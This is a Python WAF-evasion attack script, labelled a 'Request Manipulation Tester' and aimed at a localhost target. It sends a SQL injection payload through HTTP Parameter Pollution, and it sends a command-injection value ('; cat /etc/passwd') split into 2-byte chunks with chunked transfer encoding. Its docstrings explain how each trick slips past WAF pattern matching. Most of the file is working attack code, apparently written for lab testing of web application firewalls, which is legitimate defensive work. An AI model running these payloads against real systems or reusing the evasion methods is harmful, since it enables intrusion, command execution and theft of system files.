import requests
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_URL = "http://localhost:5000"

def send_hpp_attack(endpoint, param_name, normal_value, payload):
    """
    Sends a HTTP Parameter Pollution (HPP) attack.
    
    Details: By supplying the same parameter numerous times, we can test if the WAF
    inspects the first occurrence while the backend framework inherently processes 
    the second occurrence, granting a complete bypass. E.g: ?id=1&id=UNION SELECT...
    """
    url = f"{TARGET_URL}{endpoint}?{param_name}={normal_value}&{param_name}={payload}"
    print(f"\n[*] Sending HPP Attack to: {url}")
    
    try:
        response = requests.get(url, verify=False, timeout=5)
        print(f"[+] Status Code: {response.status_code}")
        return response.text[:200]
    except Exception as e:
        print(f"[-] Request Failed: {e}")
        return None

def send_chunked_request(endpoint, payload):
    """
    Sends a payload utilizing Chunked Transfer Encoding.
    
    Details: Older WAFs and simplistic proxies fail to reassemble chunked bodies 
    before running their detection logic. Splitting a payload like "SELECT" into 
    "SE" + "LE" + "CT" means the regex never finds a match, but the backend server 
    assembles and executes the completed string.
    """
    headers = {"Transfer-Encoding": "chunked", "Content-Type": "application/x-www-form-urlencoded"}
    
    def chunk_generator():
        print(f"[*] Beginning chunked transmission of: {payload}")
        # Process the payload in tiny 2-byte fragments
        for i in range(0, len(payload), 2):
            chunk = payload[i:i+2]
            print(f"  -> Sending chunk: {chunk}")
            yield chunk.encode('utf-8')
            time.sleep(0.1) # Simulate slow transmission to test state exhaustion
            
    try:
        response = requests.post(f"{TARGET_URL}{endpoint}", data=chunk_generator(), headers=headers, verify=False, timeout=5)
        print(f"\n[+] Status Code: {response.status_code}")
        return response.text[:200]
    except Exception as e:
        print(f"[-] Request Failed: {e}")
        return None

def main():
    print("=== Request Manipulation Tester ===")
    
    # 1. Test HTTP Parameter Pollution
    sqli_payload = "1' UNION SELECT 1,2,3--"
    print("Testing HTTP Parameter Pollution (HPP):")
    result_hpp = send_hpp_attack("/sqli", "username", "admin", sqli_payload)
    print(f"Backend Response snippet:\n{result_hpp}")
    
    # 2. Test Chunked Transfer
    print("\n-------------------------------\n")
    print("Testing Chunked Transfer Encoding:")
    cmd_payload = "ip=127.0.0.1; cat /etc/passwd"
    result_chunk = send_chunked_request("/cmd", cmd_payload)
    print(f"Backend Response snippet:\n{result_chunk}")

if __name__ == "__main__":
    main()